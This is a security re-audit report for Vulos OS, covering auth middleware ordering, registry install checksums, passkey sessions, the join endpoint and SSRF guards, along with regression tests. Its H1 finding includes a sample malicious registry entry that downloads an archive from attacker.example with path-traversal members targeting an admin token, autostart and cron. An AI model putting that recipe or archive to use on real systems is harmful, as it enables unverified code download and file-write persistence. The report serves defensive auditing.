# SECURITY-AUDIT-2 — Adversarial Re-Audit of Vulos OS (SECAUDIT2)

**Scope:** Full re-audit of the external attack surface on current `main`
(branch `task/SECAUDIT2`), with the grown surface since decisions.md D24:
AUTH-10 admin bearer, AUTH-12 server-side passkeys, CLUSTER-02 SQLite auth,
INIT-08 joinsync, NOTIF-02 persist, BMINIT native-launch, webproxy, registry
install, AI-apps, `/api/open`.

**Method:** static trace of every external entrypoint to its sink (grep +
targeted reads) plus an automated adversarial regression suite that encodes
each invariant. Read-only on production code; no live network / destructive
ops.

**Headline:** The single most important invariant — **SEC-A / C1: the auth
Middleware strips attacker-supplied `X-User-ID` / `X-User-Email` headers
BEFORE the AUTH-10 bearer logic — STILL HOLDS** and is now proven by an
automated test (`TestC1_HeaderStripRunsBeforeBearerLogic`). All prior
C1–C4 / H1–H6 / M3 / M4 / SEC-A/B/E/F/G/H/I fixes still hold on current main,
with **one new HIGH** regression in the registry static-install path and a
few LOW/informational items.

`cd backend && GOMAXPROCS=2 go build ./...` → **OK** at audit time.
At audit time `go test ./...` was green **except** the deliberately-failing
`TestStaticDownloadRequiresChecksum`, which encoded Finding H1 and was left red
on purpose per the audit contract.

> **Status update (re-verified by a later docs audit).** That test **passes
> now** — `go test ./services/appnet/ -run TestStaticDownloadRequiresChecksum`
> is green — because H1 was fixed. Do not read the paragraph above as a
> statement about the current tree. Every finding's live status is in the
> table below; the finding write-ups themselves are preserved as the record of
> what was found in the audit, not of what is true today.

---

## Executive Summary

| Sev | ID  | Title | Status at audit | Status now (re-verified) |
|-----|-----|-------|-----------------|--------------------------|
| HIGH | H1 | Registry static-download recipes bypass checksum enforcement **and** extract with unsafe system `tar` | OPEN (test red) | **FIXED** — `validateRecipeSecurity` now refuses any recipe with `download_url` set and no checksum (`services/appnet/registry.go`, tagged `SECAUDIT2-H1`), and `staticInstall` runs a `tar tf` pre-extraction screen rejecting absolute and `../` members before extracting. `TestStaticDownloadRequiresChecksum` passes. |
| MED  | M-1 | `/api/shell/native-launch` does not charset-validate `app_id` before manifest lookup | OPEN | **FIXED** — `^[a-z0-9][a-z0-9-]{0,63}$` charset gate before the manifest path join (`cmd/server/main.go`, tagged `SECAUDIT2 M-1`), parity with `/api/apps/launch`. |
| LOW  | L-1 | Passkeys `au12ConsumeSession` deletes the pending ceremony before the user-binding check (token-knower DoS) | OPEN | **FIXED** — expiry and `sess.UserID == userID` are both checked *before* the `delete`, so a wrong-user call cannot destroy the owner's ceremony (`services/passkeys/passkeys.go`). |
| LOW  | L-2 | `/api/setup/join` is unauthenticated post-setup (by design, but abusable as a write/SSRF primitive) | ACCEPTED-RISK / mitigated | **FIXED** — `joinsync.IsProvisioned(home)` now returns 409 before rate-limit accounting, and `joinsync.Join` re-checks (`ErrAlreadyProvisioned`) as defence in depth (`cmd/server/routes_join.go`, tagged `SECAUDIT2 L-2`). |
| INFO | I-1 | `/api/sandbox/{id}/` proxy forwards all client headers to localhost script | NOTE | **Still true** — the proxy still copies every client header to the sandbox process. It remains admin-gated and bound to 127.0.0.1, so the original "not exploitable on its own" assessment stands. |

No CRITICAL findings. The previously-fixed unauth RCE chain (D24 C1/C3/C4)
remains closed.

---

## CRITICAL findings

None. (Verified — see Regression Check.)

---

## HIGH findings

### H1 — Registry static-download recipes skip checksum + use unsafe `tar`

**Files:**
- `backend/services/appnet/registry.go:111-127` (`requiresChecksum`)
- `backend/services/appnet/registry.go:131-151` (`validateRecipeSecurity`)
- `backend/services/appnet/registry.go:468-547` (`staticInstall`), specifically
  `registry.go:517-526` (system `tar xf`) and `registry.go:502` (checksum only
  checked `if recipe.Checksum != ""`)
- Reached via `POST /api/store/registry/install` (`backend/cmd/server/main.go:1788-1812`,
  admin-gated) → `AppStore.InstallFromRegistry` → `InstallFromRegistry` →
  `staticInstall`.

**Problem.** `validateRecipeSecurity` calls `requiresChecksum(recipe.Install)`
— it inspects **only `recipe.Install`**, never `recipe.DownloadURL`. A static
recipe (`DownloadURL` set, `Install` empty) with an **empty `Checksum`** passes
the security gate untouched. `staticInstall` then:

1. Downloads `recipe.DownloadURL` over the network.
2. Only verifies the digest `if recipe.Checksum != ""` — i.e. an empty
   checksum means **no integrity check at all**.
3. For archives, extracts with `exec.CommandContext(ctx, "tar", "xf", tmpPath,
   "-C", appDir, --strip-components=N)`. The system `tar` does **not** reject
   `../` members, absolute paths, or symlink members. This is in stark
   contrast to the hardened in-process `safeExtractTarGz`
   (`store.go:264-374`) used by the *other* install path (`/api/store/install`),
   which rejects traversal/abs/symlink/zip-bomb.

**Concrete exploit.** A registry entry (registry.json is the trust root; it
can be shipped, synced via cluster, or edited by anyone with write access to
`apps/../registry.json`) of the form:

```json
{ "apps": { "evil": { "name": "Evil", "vetted": true, "type": "web",
  "versions": { "1": {
    "download_url": "https://attacker.example/p.tar.gz",
    "command": "bin/x", "port": 8080 } } } } }
```

passes `validateRecipeSecurity` with **no checksum**, and the downloaded
archive may contain `../../../../home/<user>/.vulos/db/admin-token.json`,
`../../../.config/autostart/x.desktop`, a symlink to `/etc/cron.d/`, etc. —
arbitrary-file-write → privilege escalation / persistence, with **no integrity
verification** so even a TLS-MITM or compromised mirror suffices.

**Why it matters even though it is admin-gated.** (a) The registry is meant to
be *vetted catalog data*, not a privileged operator action — the whole point
of the SEC-F/G/H3 gate is to make installing a recipe safe; this path silently
defeats it. (b) registry.json is replicated by the cluster sync path, widening
the trust boundary beyond the local admin.

**Remediation.**
1. `requiresChecksum` (or `validateRecipeSecurity`) must also require a
   non-empty `Checksum` whenever `recipe.DownloadURL != ""`.
2. `staticInstall` must extract via the hardened `safeExtractTarGz` (already
   present in the same package) instead of shelling out to system `tar`, OR at
   minimum verify the checksum unconditionally for static downloads and pass
   `tar` the containment-safe flags plus a post-extract realpath check.

**Regression test:** `backend/services/appnet/registry_secaudit2_test.go`
→ `TestStaticDownloadRequiresChecksum` (currently **FAILING** = this finding;
do not weaken). `TestStaticDownloadWithChecksumAccepted` is the positive
control for the fix.

---

## MEDIUM findings

### M-1 — `native-launch` does not charset-validate `app_id`

**File:** `backend/cmd/server/main.go:1606-1652`
(`POST /api/shell/native-launch`).

The `/api/apps/launch` handler validates `req.AppID` against an
alphanumeric/`-`/`_` charset *before* `appStore.GetManifest`
(`main.go:850-856`). The native-launch handler does **not**: it passes
`req.AppID` straight into `appStore.GetManifest(req.AppID)`
(`main.go:1629`), which is `filepath.Join(s.appsDir, appID, "app.json")`
(`store.go:518`) with no `..` guard in `GetManifest`.

**Impact (bounded):** admin-gated and native-mode-gated; the manifest must
still be valid JSON and the command must not contain `..`
(`manifest.go:122`). So this is a *constrained arbitrary `app.json` read /
manifest-confusion* (e.g. point at any directory containing an attacker-
controlled `app.json`), not direct RCE. Severity MED because the two
gates and manifest validation substantially limit it, but the missing
input validation is a real defence-in-depth gap relative to the sibling
endpoint.

**Remediation:** apply the same charset check used at `main.go:850-856`
before `GetManifest`, or add a `..`/separator guard inside
`AppStore.GetManifest`.

---

## LOW findings

### L-1 — Passkeys ceremony session deleted before owner check

**File:** `backend/services/passkeys/passkeys.go:462-484`
(`au12ConsumeSession`).

The function looks up the session token and, *if found*, `delete`s it from
the map **before** checking `sess.UserID != userID`. A party who learns/guesses
a victim's in-flight ceremony token can call any consume path with a wrong
userID and destroy the victim's pending registration/assertion (a brief,
self-healing DoS — the victim simply restarts the ceremony). No auth bypass:
the mismatched call still returns an error and no credential is created.

**Remediation:** check `sess.UserID == userID` (and expiry) *before* removing
the entry; only delete on a successful, owner-matched consume.

The cross-user binding and single-use replay defences themselves are intact
and proven by `passkeys_security_test.go`
(`TestConsumeSession_CrossUserRejected`, `TestConsumeSession_SingleUse`).

### L-2 — `/api/setup/join` is unauthenticated and usable post-setup

**Files:** `backend/services/auth/handlers.go:80-81` (publicPaths),
`backend/cmd/server/routes_join.go`, `backend/services/joinsync/joinsync.go`.

`/api/setup/join` and `/api/setup/join/status` are intentionally in
`publicPaths` (setup-time join from a fresh device). They remain reachable
**after** setup too. An unauthenticated client can therefore: (a) cause the
server to dial an attacker-supplied S3 endpoint (a constrained SSRF — the
target is an S3 client, not an arbitrary URL fetch, and the request body is
capped at 64 KiB), and (b) overwrite `~/.vulos/db/storage.json` /
`sync-state.json` (DoS / config tamper) — *if* they also supply a passphrase
that decrypts the cluster join-marker, which a non-cluster attacker cannot
produce (`joinsync/backend.go:53-77`).

**Mitigations already present (verified):** per-IP rate limit 5/min
(`routes_join.go:99-115`), 64 KiB body cap (`routes_join.go:40`), 20 s
validate timeout (`joinsync.go:205`), passphrase **never persisted**
(verified by recursive-disk-scan test), and the passphrase-gated marker
decrypt means storage.json is only written after a *correct* cluster
passphrase. Net residual risk is low (unauth IP-rate-limited SSRF to an S3
endpoint + pre-auth config-write only with a valid cluster secret).

**Recommendation:** gate these two routes behind a "setup not yet complete"
check (e.g. refuse once `instance.json` + users exist) so they cannot be
invoked on a provisioned node.

### Informational

- **I-1** — `/api/sandbox/{id}/` reverse proxy (`main.go:1020-1056`) copies
  *all* client request headers to the localhost sandbox process. The sandbox
  is admin-gated to create and bound to 127.0.0.1; still, header pass-through
  to attacker-authored Python is worth a note. Not exploitable on its own.
- **DEMO mode** (roadmap NOTIF-02 `VULOS_DEMO_MODE` seed/vacuum): **not
  implemented in current code** (no references in `backend/`). Nothing to
  gate yet — flagged so it is gated *when* added.

---

## Regression Check — do prior fixes still hold on current `main`?

| Fix | Invariant | Status on main | Evidence |
|-----|-----------|----------------|----------|
| **C1 / SEC-A** | Middleware strips `X-User-ID`/`X-User-Email` **before** anything else, incl. AUTH-10 bearer | ✅ **HOLDS** | `handlers.go:110-112` runs `r.Header.Del(...)` as the first two statements of the limiter-wrapped handler; AUTH-10 bearer block is `handlers.go:115-124` (strictly after). Proven by `TestC1_SpoofedHeaderWithNoSessionIsUnauthenticated`, `TestC1_HeaderStripRunsBeforeBearerLogic`. |
| **AUTH-10** | Invalid/forged bearer cannot authenticate; valid bearer injects only the *server-chosen* first-admin identity | ✅ HOLDS | Constant-time compare `admin_token.go:149-158`; expiry `admin_token.go:119-121`; identity from `store.at10FirstUser()` not client header. `TestAUTH10_InvalidBearerDoesNotAuthenticate`. |
| **C2** | `/api/profiles` admin-only + AIAPIKey scrubbed | ✅ HOLDS | `handlers.go:604-626`. |
| **C3** | `/api/apps/launch` admin-gated, command from manifest only | ✅ HOLDS | `main.go:821-910` (admin gate `:828`, client `Command` ignored `:836-837`). |
| **C4** | `/api/sandbox/run` admin-gated + kill-switch | ✅ HOLDS | `main.go:975-985`. |
| **H1–H6 / M3 / M4** (D24) | Auth on protected routes; `/api/open` SSRF + concurrency cap | ✅ HOLD | `routes_open.go:28-94` (scheme allow-list, `isRestrictedHost` fail-closed, `openTabMax` cap); `/api/open` **not** in publicPaths. `TestProtectedEndpointsRequireAuth`, `TestPublicPathsAreMinimal`. |
| **SEC-A** | (see C1) | ✅ HOLDS | as above |
| **SEC-B** | `extractIP` trusts `X-Forwarded-For`/`X-Real-IP` only from loopback | ✅ HOLDS | `ratelimit.go:143-167`. |
| **SEC-E** | webproxy: resolve once, validate ALL IPs, pin dial (no DNS-rebind TOCTOU) | ✅ HOLDS | `proxy.go:130-246`; pinned dialer `:61-95`. `proxy_security_test.go` (loopback / metadata-IP / mixed public+private / decimal-literal all → 403). |
| **SEC-F / SEC-G** | registry rejects pipe-to-shell; binary download needs checksum | ✅ HOLDS for the shell-`Install` path | `registry.go:84-151`; `TestPipeToShellStillRejected`, `TestDisabledRecipeRejected`. **Gap:** static `DownloadURL` path → Finding **H1**. |
| **SEC-H** | `/api/open` not public + SSRF block | ✅ HOLDS | `routes_open.go`; not in publicPaths; `TestPublicPathsAreMinimal`. |
| **SEC-H3** | binary-download recipe requires checksum | ⚠️ Partial | holds for `curl|wget` installs; **does NOT** cover `DownloadURL` static installs → Finding **H1**. |
| **SEC-I** | AI-apps id charset-validated + realpath-contained | ✅ HOLDS | `routes_aiapps_security.go:25-54`; `aiapps_security_test.go` (traversal/encoded/symlink-escape all rejected). |
| **SEC-J** | password change revokes all sessions | ✅ HOLDS | `auth.go:500-517`; `sqlite_test.go:TestChangePasswordRevokesAndPersists`. |
| **CLUSTER-02** | all SQLite queries parameterised; expiry enforced post-load; degraded-mode safe | ✅ HOLDS | `sqlite.go` (every `Exec/Query` uses `?`); `loadFromDB` drops expired sessions `sqlite.go:190-201`. `sqlite_security_test.go` (injection-payload usernames opaque, no priv-esc; expired session rejected after reload). |
| **AUTH-12** | passkey credentials sealed at rest (devicekey); userID/credID traversal blocked; session bound + single-use | ✅ HOLDS | `passkeys.go:336-355` traversal guards, `:410-438` devicekey seal, `:462-484` binding. `passkeys_security_test.go`. (LOW L-1 on delete-before-check ordering.) |
| **INIT-08** | join passphrase never persisted; rate-limited; SSRF-bounded | ✅ HOLDS (passphrase) | `joinsync.go:233-235` (passphrase only in closure); `routes_join.go:99-115` rate limit; recursive-disk-scan test `joinsync_security_test.go:TestJoin_PassphraseNeverHitsDiskAnywhere`. Residual: LOW L-2 (reachable post-setup). |
| **BMINIT native-launch** | admin + native-mode gated; arg array (no shell); scrubbed env; `..` guard on binary | ✅ HOLDS | `main.go:1606-1652`; `native.go:28-85` (exec.Command arg slice, scrubbed env, `..` reject). Gap: MED M-1 (app_id not charset-validated — manifest-read only). |
| **NOTIF-02 persist** | persist routes authenticated (not public) | ✅ HOLDS | `routes_notify_persist.go` (no publicPaths entry → behind middleware). |

---

## "Verified safe" list (audited, no issue found on current main)

- **Auth Middleware ordering** — header strip is unconditionally first; bearer
  path injects server-resolved identity only. (the critical invariant)
- **Session token path** — HMAC-signed tokens, expiry enforced in
  `ValidateToken` and again on SQLite load.
- **`/api/open`** — http/https only, fail-closed SSRF host check, concurrency
  cap, authenticated.
- **webproxy** — single-resolve + pin, all-IP deny check, IP-literal
  normalisation (decimal/hex/octal/IPv4-mapped), localhost quick-block,
  fail-closed.
- **AI-apps** — strict id regex, realpath containment, symlink-escape
  rejected, admin-gated save/delete with audit log.
- **App-store `/api/store/install` path** — `safeExtractTarGz` rejects
  `../`/absolute/symlink/hardlink/zip-bomb; checksum verified when present;
  strict id regex.
- **SQLite auth** — fully parameterised; one-time legacy-import sentinel;
  degraded-mode no-crash; expired sessions pruned on load.
- **joinsync** — passphrase memory-only (recursively verified), input-gate
  rejects blank/missing fields, S3-client-only network surface, rate limited,
  body-size capped.
- **Passkeys** — credentials devicekey-sealed at rest; userID/credID traversal
  rejected; ceremony session user-bound and single-use; 5-min TTL.
- **`/api/exec`, `/api/sandbox/run`, `/api/apps/launch`** — admin-gated +
  `VULOS_DISABLE_EXEC` kill-switch + audit log.
- **`extractIP` / `cookieDomain`** — proxy headers trusted only from loopback;
  cookie scoped per-instance.

---

## Adversarial regression test files added

All compile and run under `cd backend && GOMAXPROCS=2 go test ./...`. They
assert the fixes hold; a FAIL is a real finding (only H1's is intentionally
left red).

| File | Package | Encodes |
|------|---------|---------|
| `backend/security/doc.go` | `security` | package doc |
| `backend/security/auth_middleware_security_test.go` | `security` | **C1/SEC-A ordering**, AUTH-10 invalid/valid bearer, session path intact, protected routes 401, public-path allow-list minimal |
| `backend/services/joinsync/joinsync_security_test.go` | `joinsync` | passphrase never on disk (recursive scan), sanitize() rejects all missing fields |
| `backend/services/webproxy/proxy_security_test.go` | `webproxy` | SEC-E: Handler blocks loopback/metadata/mixed/decimal-literal SSRF |
| `backend/cmd/server/aiapps_security_test.go` | `main` | SEC-I id regex + realpath containment + symlink-escape |
| `backend/services/appnet/registry_secaudit2_test.go` | `appnet` | **H1** static-download checksum (RED), pipe-to-shell, disabled-entry |
| `backend/services/passkeys/passkeys_security_test.go` | `passkeys` | AUTH-12 userID/credID traversal, cross-user + single-use session |
| `backend/services/auth/sqlite_security_test.go` | `auth` | CLUSTER-02 SQL-injection opaqueness + post-SQLite expiry |

**Validation result:** full `go test ./...` is green except
`appnet/TestStaticDownloadRequiresChecksum` — the encoded HIGH finding H1,
left failing per the audit contract so the regression is impossible to ignore.
